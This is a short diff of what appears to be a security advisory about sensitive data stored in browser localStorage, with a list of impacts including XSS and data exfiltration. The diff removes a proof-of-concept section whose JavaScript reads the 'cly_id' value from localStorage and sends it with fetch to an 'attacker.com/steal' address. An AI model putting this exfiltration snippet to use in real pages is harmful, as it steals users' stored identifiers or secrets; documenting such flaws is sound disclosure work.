@@ -27,13 +27,4 @@ This creates a security risk where attackers can extract sensitive information i
 - Increased attack surface via XSS
 - Potential data exfiltration
 
----
 
-## 💣 Proof of Concept (PoC)
-
-```js
-// Extract sensitive data
-const data = localStorage.getItem("cly_id");
-
-// Exfiltrate to attacker server
-fetch("https://attacker.com/steal?data=" + data);
